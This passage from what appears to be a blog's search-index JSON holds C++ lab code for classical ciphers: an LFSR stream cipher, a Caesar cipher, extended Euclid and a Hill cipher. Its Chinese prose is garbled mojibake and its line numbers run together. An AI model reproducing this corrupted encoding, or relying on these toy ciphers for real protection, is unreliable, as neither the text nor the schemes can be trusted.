jj=0;jj&lt;31;++jj) cout&lt;&lt;a[jj]&lt;&lt;&#x27; &#x27;; cout&lt;&lt;endl;//////////////////////// int i=0,key; cout&lt;&lt;&quot;è¯·é€‰æ‹©æ“ä½œæ–¹å¼ï¼š1-åŠ å¯† 2-è§£å¯†&quot;&lt;&lt;endl; cin&gt;&gt;key; vector&lt;int&gt;s,ss; if(key==1||key==2) &#123; if(key==1) &#123; cout&lt;&lt;&quot;åŠ å¯†æˆåŠŸï¼Œå¯†æ–‡è§out.txt&quot;&lt;&lt;endl; ifstream in(&quot;in.txt&quot;); ofstream out(&quot;out.txt&quot;); char c; while(in&gt;&gt;c) &#123; int sum=0; int j; for(j=0;j&lt;8;++j) sum+=pow((double)2,(double)(7-j))*a[(i+j)%31]; if(i+j&gt;32) i=(i+j-1)%31+1; else i=i+8; s.push_back((int(c))^sum); &#125; for(int kk=0;kk&lt;s.size();++kk) &#123; out&lt;&lt;char(s[kk]); &#125; &#125; if(key==2) &#123; cout&lt;&lt;&quot;è§£å¯†æˆåŠŸï¼Œæ˜æ–‡è§in.txt&quot;&lt;&lt;endl; ifstream in(&quot;out.txt&quot;); ofstream out(&quot;in.txt&quot;); char c; while(in&gt;&gt;c) &#123; int sum=0; int j; for(j=0;j&lt;8;++j) sum+=pow((double)2,(double)(7-j))*a[(i+j)%31]; if(i+j&gt;32) i=(i+j-1)%31+1; else i=i+8; s.push_back((int(c))^sum); &#125; for(int kk=0;kk&lt;s.size();++kk) out&lt;&lt;char(s[kk]); &#125; &#125; else cout&lt;&lt;&quot;æ“ä½œæ— æ•ˆï¼&quot;&lt;&lt;endl;&#125;","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"å¯†ç å­¦","slug":"å®éªŒ/å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"æµå¯†ç ","slug":"æµå¯†ç ","permalink":"https://gryffinbit.top/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}],"author":"Gryffinbit"},{"title":"å•è¡¨ä»£æ¢/å¤šè¡¨ä»£æ¢å®éªŒ","slug":"å•è¡¨å¤šè¡¨ä»£æ¢å®éªŒ","date":"2020-08-19T11:16:23.000Z","updated":"2024-11-12T07:00:19.000Z","comments":true,"path":"2020/08/19/å•è¡¨å¤šè¡¨ä»£æ¢å®éªŒ/","permalink":"https://gryffinbit.top/2020/08/19/%E5%8D%95%E8%A1%A8%E5%A4%9A%E8%A1%A8%E4%BB%A3%E6%8D%A2%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"#å•è¡¨ä»£æ¢ã€å¤šè¡¨ä»£æ¢ å®éªŒ ä¸€ã€å®éªŒé¢˜ç›®å•è¡¨ä»£æ¢å’Œå¤šè¡¨ä»£æ¢ äºŒã€å®éªŒç›®çš„å’Œè¦æ±‚é€šè¿‡å®éªŒç†Ÿç»ƒæŒæ¡å‡¯æ’’å¯†ç å’ŒHillå¯†ç ç®—æ³•åŸç†ï¼Œç¼–ç¨‹å®ç°åŠ å¯†ç®—æ³•ï¼Œç†Ÿæ‚‰æ¨¡è¿ç®—å’Œæ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•ï¼Œæé«˜C++ç¨‹åºè®¾è®¡å’Œå¯†ç è¿ç®—åŸºæœ¬èƒ½åŠ›ã€‚ å•è¡¨ä»£æ¢ç¼–ç¨‹å®ç°å‡¯æ’’å¯†ç ï¼Œè¾“å…¥ä»»æ„ä¸€æ®µæ˜æ–‡ï¼Œå¯¹å…¶åŠ å¯†å¹¶è¾“å‡ºå¯†æ–‡ã€‚å¤šè¡¨ä»£æ¢ç¼–ç¨‹å®ç° Hill åŠ å¯†ç®—æ³•ï¼Œè¾“å…¥ä¸€æ®µæ— ç©ºæ ¼çš„äº”ä¸ªå°å†™å­—æ¯æ˜æ–‡ï¼Œå¯¹å…¶åŠ å¯†å¹¶è¾“å‡ºå¯†æ–‡ã€‚ ä¸‰ã€å®éªŒç¯å¢ƒClionã€macOS Catalina 10.15.6 å››ã€å®éªŒå†…å®¹4.1å•è¡¨ä»£æ¢:å‡¯æ’’å¯†ç å¯†é’¥ä¸º 3ï¼Œä»æ–‡æœ¬æ–‡ä»¶ä¸­è¯»å–æ˜æ–‡ï¼Œç”¨å¯†é’¥åŠ å¯†ï¼Œå¯†æ–‡ä¿å­˜äºå¯¹åº”å¯†æ–‡æ•°ç»„ã€‚ 4.2å¤šè¡¨ä»£æ¢:1.å¯†é’¥ç”Ÿæˆï¼šHill åŠ å¯†çš„å¯†é’¥çŸ©é˜µ K éšæœºç”Ÿæˆï¼Œéœ€è¦è¿›è¡Œåœ¨æ¨¡ 26 çš„æ„ä¹‰ä¸‹è¿›è¡Œå¯é€†æ€§æ£€æµ‹ï¼Œè¿™é‡Œå¯ä»¥ç”¨æ±‚è¡Œåˆ—å¼æ¨¡ 26 çš„é€†å…ƒã€‚2.è¯»å–æ˜æ–‡å¹¶é¢„å¤„ç†ï¼šè¾“å…¥çš„æ˜æ–‡æ˜¯ 5 ä¸ªå°å†™å­—æ¯ï¼Œå½¼æ­¤ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼Œè€Œåæ”¾å…¥ 5 ä¸ªå…ƒç´ çš„æ˜æ–‡æ•°ç»„ã€‚3.åŠ å¯†ï¼šå°†å¯†é’¥çŸ©é˜µä¸æ˜æ–‡æ•°ç»„å·¦ä¹˜ï¼Œåœ¨æ¨¡ 26 çš„æ„ä¹‰ä¸‹ï¼Œç”Ÿæˆå¯†æ–‡æ•°ç»„ã€‚ 4.è§£å¯†ï¼šå°†å¯†é’¥çŸ©é˜µçš„ä¼´éšé˜µ D æ±‚å‡ºï¼Œå·¦ä¹˜å¯†æ–‡æ•°ç»„ï¼Œå†ä¹˜å¯†é’¥çŸ©é˜µè¡Œåˆ—å¼çš„é€†ï¼Œä»è€Œå®Œæˆé€†çŸ©é˜µå·¦ä¹˜ï¼Œéƒ½åœ¨æ¨¡ 26 çš„æ„ä¹‰ä¸‹ã€‚ äº”ã€ç®—æ³•æè¿°åŠå®éªŒæ­¥éª¤5.1å•è¡¨ä»£æ¢ä»¥å‡¯æ’’å¯†ç ä¸ºä¾‹ï¼š åŠ è§£å¯†åŸç† $$c&#x3D;E_{key}(m)\\equiv m+key(mod\\ 26) , 0\\leq m \\leq25\\ \\ \\ åŠ å¯†æ—¶ï¼Œæ¯ä¸ªå­—æ¯åç§»keyä½$$ $$m&#x3D;D_{key}(c)\\equiv c-key(mod\\ 26) , 0\\leq c \\leq25\\ \\ \\ \\ è§£å¯†æ—¶ï¼Œæ¯ä¸ªå­—æ¯å‰ç§»keyä½$$ å»ºç«‹ä¸€ä¸ªplaintext.txtæ–‡ä»¶ï¼Œç”¨æ¥å­˜æ”¾éœ€è¦åŠ å¯†çš„æ˜æ–‡mã€‚ åˆ©ç”¨fgetså‡½æ•°ï¼Œæ¥å°†æ–‡ä»¶ä¸­çš„å­—ç¬¦è¯»å–åˆ°messageä¸­ã€‚é€å­—è¯»å–æ˜æ–‡é•¿çŸ­ï¼Œå¹¶ä¸”å¤åˆ¶å‡ºæ˜æ–‡å†…å®¹ï¼Œå°†å…¶æ‰“å°å‡ºæ¥ã€‚è¾“å…¥keyã€‚è¿›è¡Œé€ä½å¾ªç¯ã€‚åŠ å¯†ï¼šc&#x3D;m+key(mod 26)ã€‚ å°†åŠ å¯†ç»“æœå­˜å‚¨åœ¨ciphertextä¸­ã€‚ å¹¶ä¸”æ‰“å°å‡ºæ¥ã€‚ 5.2å¤šè¡¨ä»£æ¢ä»¥Hillcipherä¸ºä¾‹ï¼š åŠ å¯†åŸç†ï¼š å°†æ˜æ–‡Mï¼Œåˆ†æˆç”±nä¸ªå­—æ¯æ„æˆçš„åˆ†ç»„ï¼Œå¯¹å„ä¸ªåˆ†ç»„MåŠ å¯†ï¼š $$C_i \\equiv AM_i+B(mod\\ N),i&#x3D;1,2,3..j$$ (A,B)æ˜¯å¯†é’¥ã€‚Aæ˜¯ n*nçš„å¯é€†çŸ©é˜µã€‚ è§£å¯†ï¼š $$M_i\\equiv A^{-1}(C_i-B)(mod\\ N),i&#x3D;1,2,3..j$$ ä¸ºäº†æ»¡è¶³å¯é€†çŸ©é˜µçš„æ¡ä»¶ï¼š $$gcd(|A|,N)&#x3D;1 \\ \\ \\ \\ \\ \\ \\ |A|ä¸ºè¡Œåˆ—å¼$$ å¦‚æœçŸ©é˜µå¯é€†ï¼Œé‚£ä¹ˆå®ƒçš„é€†çŸ©é˜µå’Œå®ƒçš„ä¼´éšçŸ©é˜µä¹‹é—´åªå·®ä¸€ä¸ªç³»æ•°ã€‚ å®šä¹‰55çš„çŸ©é˜µã€‚ç”¨dæ¥è¡¨ç¤ºaã€bçš„æœ€å¤§å…¬çº¦æ•°ã€‚å…¶ä¸­aä»£è¡¨çš„æ˜¯|A|,bä»£è¡¨çš„æ˜¯Nã€‚ ä¸ºä¿è¯Aæ˜¯å¯é€†çŸ©é˜µã€‚class Hill_Cipher çš„ç›®çš„ï¼Œç”Ÿæˆæ»¡è¶³å¯é€†æ¡ä»¶çš„çŸ©é˜µã€‚æ ¹æ®åŠ å¯†ç®—æ³•å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†ã€‚* å…­ã€è°ƒè¯•è¿‡ç¨‹åŠç»“æœï¼ˆé™„æˆªå›¾ï¼‰6.1å•è¡¨ä»£æ¢ 6.2å¤šè¡¨ä»£æ¢ ä¸ƒã€æ€»ç»“ä½“ä¼š7.1å•è¡¨ä»£æ¢â“â“ä»£ç å¦‚ä½•ä»è¾“å…¥çš„å­—ç¬¦è½¬æ¢ä¸ºå¯å¤„ç†çš„æ•°å­—ï¼Ÿ â€¼ï¸é€šè¿‡asciiç çš„è½¬æ¢ï¼šå¦‚char A &#x3D; â€˜65â€™ åŠ å¯†æ—¶ï¼Œè¿›è¡Œé€ä½çš„å¾ªç¯æ“ä½œã€‚å­—æ¯æ§åˆ¶åœ¨Aï½Z 12345678910111213/* æµ‹è¯•ä»£ç  */#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;int main()&#123; char message[3]=&#123;&#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;&#125;; if (message[1]&gt;65) cout&lt;&lt;message[1]&lt;&lt;endl; return 0;&#125; æµ‹è¯•ç›®çš„ã€‚å¯ä»¥æ ¹æ®charç±»å‹asciiæ¥è¿›è¡Œå¤§å°çš„æ¯”è¾ƒã€‚ è‹¥asciiç å¯¹åº”çš„æ•°å€¼å¤§äºintçš„æ•°å­—ï¼Œåˆ™è¾“å‡ºè¯¥å­—æ¯ã€‚ Bå¯¹åº”66ï¼Œæ‰€ä»¥å¤§äº65ï¼Œä¼šè¾“å‡ºB 7.2å¤šè¡¨ä»£æ¢â“â“ä»£ç å¦‚ä½•è¿›è¡Œæ‰©å±•æ¬§å‡ é‡Œå¾·ç®—æ³•æ±‚é€†å…ƒï¼Ÿ â€¼ï¸ç»™å®š a å’Œbã€‚a è¦æœ‰é€†å…ƒ ï¼Œ é‚£ä¹ˆgcdï¼ˆ a ï¼Œ b ) &#x3D; 1å‡è®¾açš„é€†å…ƒ ä¸ºx ï¼Œ é‚£ä¹ˆå°±æœ‰ a * x mod b &#x3D; 1ä¹Ÿå°±æ˜¯ a * x + b * y &#x3D; 1ã€‚å…¶ä¸­ x å°±æ˜¯ açš„é€†å…ƒã€‚ 1234567891011121314151617181920212223#include &lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;cstdio&gt;using namespace std;int x,y,q;void ex_Eulid(int a,int b)&#123; if(b==0)&#123; x=1;y=0;q=a; &#125; else&#123; ex_Eulid(b,a%b); double temp=x; x=y;y=temp-a/b*y; &#125;&#125;int main() &#123; int a,b; cin&gt;&gt;a&gt;&gt;b; if(a&lt;b)swap(a,b); ex_Eulid(a,b); printf(&quot;%d=(%d)*%d+(%d)*%d\\n&quot;,q,x,a,y,b); return 0;&#125; å…«ã€æºç¨‹åºé™„å½•8.1å•è¡¨ä»£æ¢12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;int main(int argc, char *argv[])&#123; FILE *file1; //FILE* æŒ‡é’ˆä½œä¸ºæ–‡ä»¶å¥æŸ„ï¼Œæ˜¯æ–‡ä»¶è®¿é—®çš„å”¯ä¸€æ ‡è¯†ï¼Œå®ƒç”±fopenå‡½æ•°åˆ›å»º char message[50],plaintext[50],ciphertext[50]; //å®šä¹‰å­—ç¬¦æ•°ç»„ï¼Œfgetsè¯»å…¥æ•°æ®ã€‚messageæ˜æ–‡ int i,lenthofmessage,key; file1=fopen(&quot;plaintext.txt&quot;,&quot;r&quot;); //fopenæ‰“å¼€æ–‡ä»¶æˆåŠŸï¼Œåˆ™è¿”å›ä¸€ä¸ªæœ‰æ•ˆçš„FILE*æŒ‡é’ˆï¼Œå¦åˆ™è¿”å›ç©ºæŒ‡é’ˆNULL //FILE *fopenï¼ˆæ–‡ä»¶åå­—ç¬¦ä¸²ï¼Œæ‰“å¼€æ–¹å¼ä¸²ï¼‰&quot;r&quot;æˆ–&quot;rt&quot;:æ­£æ–‡æ–‡ä»¶åªè¯»æ–¹å¼æ‰“å¼€ fgets(message,50,file1); //è¯»å…¥æ•°æ®åˆ°messageï¼ŒæŒ‡é’ˆæŒ‡åˆ°file1ï¼Œä»¥æ‰§è¡Œæ‰“å¼€file1çš„åŠ¨ä½œ printf(&quot;length of plaintext: %lu&quot;, strlen(message)); //å®šä¹‰ä¸ºlong unsignedç±»å‹ï¼Œæ˜¾ç¤ºå­—ç¬¦ä¸²çš„é•¿åº¦ lenthofmessage=strlen(message); //å°†ä¸Šä¸€æ­¥å¾—åˆ°çš„messageçš„é•¿åº¦èµ‹å€¼ç»™intå‹çš„lenthofmessage strcpy(plaintext,message); //strcpyçš„ç”¨æ³•ï¼Œå°†str2çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ°str1ä¸­ã€‚ å°†messageå¤åˆ¶åˆ°plaintextä¸­ printf(&quot;\\nplaintext is:&quot;); for (i=0;i&lt;lenthofmessage;i++) printf(&quot;%c&quot;,plaintext[i]); //æŒ‰messageçš„é•¿åº¦ï¼Œé€å­—è¾“å‡º printf(&quot;\\nPlease input the key:&quot;); //è¾“å…¥å‡¯æ’’å¯†ç çš„å¯†é’¥ scanf(&quot;%d&quot;,&amp;key); i=0; while (i&lt;lenthofmessage) //é€ä½å¾ªç¯ &#123; if (plaintext[i]&gt;=&#x27;A&#x27;&amp;&amp;plaintext[i]&lt;=&#x27;Z&#x27;) //å­—æ¯æ§åˆ¶åœ¨Aï½Z ciphertext[i]=&#x27;A&#x27;+(plaintext[i]-&#x27;A&#x27;+key)%26; //åŠ å¯†ï¼šc=m+key(mod 26) else if (plaintext[i]&gt;=&#x27;a&#x27;&amp;&amp;plaintext[i]&lt;=&#x27;z&#x27;) ciphertext[i]=&#x27;a&#x27;+(plaintext[i]-&#x27;a&#x27;+key)%26;// else if (plaintext[i]==&#x27; &#x27;) ciphertext[i]=&#x27; &#x27;; else ciphertext[i]=plaintext[i]; i++; &#125; ciphertext[i]=&#x27;\\0&#x27;; printf(&quot;\\n&quot;); printf(&quot;ciphertext:&quot;); i=0; for (i=0;i&lt;=lenthofmessage;i++) printf(&quot;%c&quot;,ciphertext[i]); fclose(file1); getchar(); return 0;&#125; 8.2å¤šè¡¨ä»£æ¢123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;memory.h&gt;#include &lt;cstdlib&gt;#include &lt;ctime&gt;#include &lt;cstdio&gt;#include &lt;cmath&gt;using namespace std;//å®šä¹‰ä¸€äº›å¸¸å˜é‡const int M = 26; //å®šä¹‰é›†åˆ&#123;a,b,...,z&#125;çš„26ä¸ªè‹±æ–‡å­—æ¯//è¡Œå’Œåˆ—å‡ä¸º5const int ROW = 5;const int COL = 5;//å®šä¹‰5*5çš„åŠ å¯†çŸ©é˜µint K[ROW][COL];//å®šä¹‰5*5çš„è§£å¯†çŸ©é˜µint D[ROW][COL];int P[ROW]; //æ˜æ–‡å•å…ƒint C[ROW]; //å¯†æ–‡å•å…ƒint F[ROW]; //å¯†æ–‡è§£å¯†åçš„å•å…ƒ//ä¸‰å…ƒç»„gcd(a,b) = ax + by = dstruct GCD&#123; int x; int y; int d;&#125;;class Hill_Cipher&#123;public: //äº§ç”ŸéšæœºçŸ©é˜µ void random_Matrix(); //æ±‚çŸ©é˜µçš„è¡Œåˆ—å¼ int Det(int matrix[ROW][ROW],int row); //æ±‚ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•° int gcd(int a,int b); /* *åˆ¤æ–­çŸ©é˜µKæ˜¯å¦åœ¨æ¨¡26çš„æƒ…å†µä¸‹å¯é€† *å› ä¸ºçŸ©é˜µåœ¨æ¨¡26çš„æƒ…å½¢ä¸‹å­˜åœ¨å¯é€†çŸ©é˜µçš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯ *gcd(det K,26) = 1 */ bool Inverse(int matrix[ROW][ROW]); //çŸ©é˜µç›¸ä¹˜ void multiphy(int matrix[ROW][ROW],int p[ROW],int row); //æ±‚å‡ºä¼´éšçŸ©é˜µ void adjoint_matrix(int matrix[ROW][ROW],int row); //å°†æ˜æ–‡åŠ å¯†ä¸ºå¯†æ–‡ string encryption(string plaintext); //å°†å¯†æ–‡è§£å¯†ä¸ºæ˜æ–‡(ä¸ºäº†è¾¨è¯†æ¸…æ¥š,æˆ‘ä»¬ç»Ÿä¸€ä»¥å°å†™å­—æ¯ä½œä¸ºæ˜æ–‡,å¤§å†™å­—æ¯ä½œä¸ºå¯†æ–‡) string deciphering(string ciphertext); //æ¬§å‡ é‡Œå¾—ç®—æ³•æ±‚æ¨¡çš„é€† GCD extended_Euclid(int a,int b); //æ¨¡é€†è¿ç®— int inverse(int a,int m); //ç”±äºC++ä¸å­˜åœ¨è´Ÿæ•°å–æ¨¡çš„å†…ç½®å‡½æ•°,ç°åœ¨è‡ªå·±è®¾å®šä¸€ä¸ª //å®šä¹‰ä¸€ä¸ªæ¨¡Mçš„å€¼ int Mod(int a);&#125;;void Hill_Cipher::random_Matrix()&#123; int i,j; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; COL;j++) &#123; K[i][j] = rand() % 26; //äº§ç”Ÿä¸€ä¸ª5*5æ¨¡26çš„çŸ©é˜µ &#125; &#125; cout &lt;&lt; &quot;éšæœºäº§ç”Ÿ5*5çš„çŸ©é˜µ:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; COL;j++) &#123; printf(&quot;%2d &quot;,K[i][j]); &#125; cout &lt;&lt; endl; &#125;&#125;//æ±‚çŸ©é˜µçš„è¡Œåˆ—å¼int Hill_Cipher::Det(int matrix[ROW][ROW],int row)&#123; int i,j; int cofa[ROW][ROW]; //ç”¨äºå­˜æ”¾ä½™å­é˜µ int l; //lä¸ºæ‰€é€’å½’çš„ä½™å­é˜µçš„è¡Œ int p = 0,q = 0; int sum=0; //ç”±äºè¡Œå’Œåˆ—ç›¸åŒ(æ–¹é˜µ),æ‰€ä»¥è¡Œåˆ—å¼çš„å€¼ä¸€å®šå­˜åœ¨,æ•…ä¸éœ€è¦åˆ¤æ–­æ˜¯å¦ä¸ºæ–¹é˜µ //é€’å½’åŸº if(row == 1) return matrix[0][0]; for(i = 0;i &lt; row; i++) &#123; for(l = 0;l &lt; row - 1;l++) &#123; if(l &lt; i) p=0; else p=1; for(j = 0;j&lt; row - 1;j++) &#123; cofa[l][j] = matrix[l + p][j + 1]; &#125; &#125; //ç›¸å½“äº(-1)^i if(i % 2 == 0) q=1; else q=(-1); sum = sum + matrix[i][0] * q * Det(cofa,row - 1); &#125; return sum;&#125;//æ±‚ä¸¤ä¸ªæ•°çš„æœ€å¤§å…¬çº¦æ•°int Hill_Cipher::gcd(int a,int b)&#123; int temp; //äº¤æ¢ä¸¤ä¸ªæ•°çš„å¤§å°,ä½¿å¾—aä¸ºè¾ƒå¤§æ•° if(a &lt; b) &#123; temp = a; a = b; b = temp; &#125; while(a % b) &#123; temp = b; b = a % b; a = temp; &#125; return b;&#125;/* *åˆ¤æ–­çŸ©é˜µKæ˜¯å¦åœ¨æ¨¡26çš„æƒ…å†µä¸‹å¯é€† *å› ä¸ºçŸ©é˜µåœ¨æ¨¡26çš„æƒ…å½¢ä¸‹å­˜åœ¨å¯é€†çŸ©é˜µçš„å……åˆ†å¿…è¦æ¡ä»¶æ˜¯ *gcd(det K,26) = 1 */bool Hill_Cipher::Inverse(int matrix[ROW][ROW])&#123; if(gcd(Det(matrix,ROW),M) == 1) return true; else return false;&#125;void Hill_Cipher::multiphy(int matrix[ROW][ROW],int p[ROW],int row)&#123; int i,j; //å…ˆå°†å¯†æ–‡å•å…ƒæ¸…é›¶ memset(C,0,sizeof(C)); for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; C[i] += P[j] * K[j][i]; &#125; &#125;&#125;//å°†æ˜æ–‡åŠ å¯†ä¸ºå¯†æ–‡string Hill_Cipher::encryption(string plaintext)&#123; int i; string ciphertext; //å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ˜æ–‡æ•°ç»„ for(i = 0;i &lt; ROW;i++) &#123; P[i] = plaintext[i] - &#x27;a&#x27;; &#125; multiphy(K,P,ROW); //å°†å¯†æ–‡æ•°ç»„è½¬åŒ–ä¸ºå¯†æ–‡ for(i = 0;i &lt; ROW;i++) //è¿™é‡Œå…ˆå°†å…¶æ¨¡26,å†ç¿»è¯‘ä¸ºå¯¹åº”çš„å­—æ¯ &#123; C[i] =Mod(C[i]); ciphertext += C[i] + &#x27;A&#x27;; &#125; return ciphertext;&#125;//æ±‚å‡ºä¼´éšçŸ©é˜µvoid Hill_Cipher::adjoint_matrix(int matrix[ROW][ROW],int row)&#123; int i,j,k,l; int p,q; p = q = 0; int temp[ROW][ROW]; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; for(k = 0;k &lt; ROW - 1;k++) &#123; if(k &lt; i) p = 0; else p = 1; for(l = 0;l &lt; ROW - 1;l++) &#123; if(l &lt; j) q = 0; else q = 1; temp[k][l] = matrix[k+p][l+q]; &#125; &#125; D[j][i] = (int)pow(-1,(double)i+j)*Det(temp,ROW-1); D[j][i] = Mod(D[j][i]); &#125; &#125;&#125;//å°†å¯†æ–‡è§£å¯†ä¸ºæ˜æ–‡(ä¸ºäº†è¾¨è¯†æ¸…æ¥š,æˆ‘ä»¬ç»Ÿä¸€ä»¥å°å†™å­—æ¯ä½œä¸ºæ˜æ–‡,å¤§å†™å­—æ¯ä½œä¸ºå¯†æ–‡)string Hill_Cipher::deciphering(string ciphertext)&#123; //æ±‚å‡ºçŸ©é˜µçš„é€† string text; int determinant = Det(K,ROW); int inver = inverse(determinant,26); adjoint_matrix(K,ROW); //ä¼´éšçŸ©é˜µ cout &lt;&lt; &quot;è¡Œåˆ—å¼çš„å€¼: &quot; &lt;&lt; determinant &lt;&lt; endl; int i,j; memset(F,0,sizeof(F)); for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; F[i] += C[j] * D[j][i]; &#125; F[i] *= inver; F[i] = Mod(F[i]); //ç®—åˆ°çš„ç»“æœè¦æ¨¡å»26 &#125; for(i = 0;i &lt; ROW;i++) text += F[i] + &#x27;a&#x27;; return text;&#125;GCD Hill_Cipher::extended_Euclid(int a,int b)&#123; GCD aa,bb; if(b == 0) &#123; aa.x = 1; aa.y = 0; aa.d = a; return aa; &#125; else &#123; bb = extended_Euclid(b,a%b); aa.x = bb.y; aa.y = bb.x - (a / b) * bb.y; aa.d = bb.d; &#125; return aa;&#125;int Hill_Cipher::inverse(int a,int m)&#123; GCD aa; aa = extended_Euclid(a,m); return aa.x;&#125;int Hill_Cipher::Mod(int a)&#123; return a &gt;= 0 ? a % M : (M + a % M);&#125;int main()&#123; int i,j; Hill_Cipher hh; cout &lt;&lt; &quot;ä½¿ç”¨å¸Œå°”å¯†ç è¿›è¡Œæ¶ˆæ¯çš„åŠ è§£å¯†:&quot; &lt;&lt; endl; //srand()å‡½æ•°äº§ç”Ÿä¸€ä¸ªä»¥å½“å‰æ—¶é—´å¼€å§‹çš„éšæœºç§å­.ä»¥ä¿è¯æ¯æ¬¡äº§ç”Ÿçš„éšæœºæ•°çŸ©é˜µéƒ½ä¸ç›¸åŒ srand((unsigned)time(0)); hh.random_Matrix(); while(!hh.Inverse(K)) &#123; cout &lt;&lt; &quot;è¯¥çŸ©é˜µæ¨¡26ä¸å¯é€†,ä¸å¯ä»¥ä½œä¸ºå¯†é’¥!&quot; &lt;&lt; endl; cout &lt;&lt; endl; hh.random_Matrix(); &#125; cout &lt;&lt; &quot;è¯¥çŸ©é˜µæ¨¡26å¯é€†,å› æ­¤å¯ä»¥ä½œä¸ºå¯†é’¥.&quot; &lt;&lt; endl; cout &lt;&lt; endl; //åˆ©ç”¨æ‰€é€‰å¯†é’¥ï¼Œå¯¹ç»™å®šçš„5å…ƒæ˜æ–‡ä¿¡æ¯è¿›è¡ŒåŠ è§£å¯† string plaintext,ciphertext; cout &lt;&lt; &quot;è¯·è¾“å…¥5å…ƒæ˜æ–‡ä¿¡æ¯ï¼Œä»…æ”¯æŒå°å†™å­—æ¯ï¼Œæ— ç©ºæ ¼:&quot; &lt;&lt; endl; cin &gt;&gt; plaintext; ciphertext = hh.encryption(plaintext); cout &lt;&lt; endl; cout &lt;&lt; &quot;è¯¥æ˜æ–‡é€šè¿‡å¸Œå°”å¯†ç æ³•åŠ å¯†è¿‡å,è¾“å‡ºçš„å¯†æ–‡æ¶ˆæ¯ä»¥å¤§å†™æ–¹å¼è¾“å‡ºä¸º:&quot; &lt;&lt; endl; cout &lt;&lt; ciphertext &lt;&lt; endl; cout &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥0:é€€å‡º ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥1:æŸ¥çœ‹æ˜æ–‡ç©ºé—´å¯¹***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥2:æŸ¥çœ‹å¯†æ–‡ç©ºé—´å¯¹***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥3:æŸ¥çœ‹å¯†é’¥ ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥4:å°†æ¶ˆæ¯è§£å¯† ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥5:æŸ¥çœ‹èœå• ***&quot; &lt;&lt; endl; char c; while(cin &gt;&gt; c) &#123; if(c == &#x27;0&#x27;) &#123; cout &lt;&lt; endl; cout &lt;&lt; &quot;é€€å‡º&quot; &lt;&lt; endl; break; &#125; else if(c == &#x27;1&#x27;) &#123; cout &lt;&lt; &quot;æ˜æ–‡ç©ºé—´:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) cout &lt;&lt; P[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; cout &lt;&lt; endl; &#125; else if(c == &#x27;2&#x27;) &#123; cout &lt;&lt; &quot;å¯†æ–‡ç©ºé—´:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) cout &lt;&lt; C[i] &lt;&lt; &quot; &quot;; cout &lt;&lt; endl; cout &lt;&lt; endl; &#125; else if(c == &#x27;3&#x27;) &#123; cout &lt;&lt; &quot;å¯†é’¥:&quot; &lt;&lt; endl; for(i = 0;i &lt; ROW;i++) &#123; for(j = 0;j &lt; ROW;j++) &#123; printf(&quot;%2d &quot;,K[i][j]); &#125; cout &lt;&lt; endl; &#125; cout &lt;&lt; endl; &#125; else if(c == &#x27;4&#x27;) &#123; hh.adjoint_matrix(K,ROW); string ss; ss = hh.deciphering(ciphertext); cout &lt;&lt; &quot;è¯¥å¯†æ–‡è§£å¯†è¿‡å,æ˜¾ç¤ºçš„åŸæ¥çš„æ˜æ–‡æ¶ˆæ¯:&quot; &lt;&lt; endl; cout &lt;&lt; ss &lt;&lt; endl; cout &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;***è¾“å…¥0:é€€å‡º ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥1:æŸ¥çœ‹æ˜æ–‡ç©ºé—´å¯¹***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥2:æŸ¥çœ‹å¯†æ–‡ç©ºé—´å¯¹***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥3:æŸ¥çœ‹å¯†é’¥ ***&quot; &lt;&lt; endl; cout &lt;&lt; &quot;***è¾“å…¥4:å°†æ¶ˆæ¯è§£å¯† ***&quot; 